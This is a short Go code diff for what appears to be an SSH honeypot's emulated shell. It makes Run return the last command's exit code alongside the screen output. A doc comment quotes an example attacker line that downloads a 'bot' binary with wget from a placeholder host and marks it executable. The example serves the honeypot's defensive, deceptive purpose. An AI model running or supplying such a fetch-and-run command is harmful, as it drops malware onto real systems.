@@ -41,8 +41,9 @@ type step struct {
 }
 
 // Run executes a whole line, e.g. "cd /tmp && wget http://x/bot; chmod +x bot".
-// Returns what appears on screen (lines end in \n) and whether the attacker typed exit.
-func (s *Shell) Run(line string) (string, bool) {
+// Returns what appears on screen (lines end in \n), the exit code of the last command that ran
+// (like $?: 0 = ok, 127 = not found; SSH sends it to the client) and whether the attacker typed exit.
+func (s *Shell) Run(line string) (string, int, bool) {
 	var screen strings.Builder
 	code := 0        // exit code of the last command run: 0 = ok
 	piped := ""      // output kept for the next command if it is linked with |
@@ -67,7 +68,7 @@ func (s *Shell) Run(line string) (string, bool) {
 		out, c, exit := s.exec(st.args, input)
 		code = c
 		if exit {
-			return screen.String(), true
+			return screen.String(), code, true
 		}
 
 		// if the next command is linked with |, the output goes to it, not to the screen
@@ -77,7 +78,7 @@ func (s *Shell) Run(line string) (string, bool) {
 			screen.WriteString(out)
 		}
 	}
-	return screen.String(), false
+	return screen.String(), code, false
 }
 
 // parse splits the line into commands on ; && || | (but not inside quotes), and each command
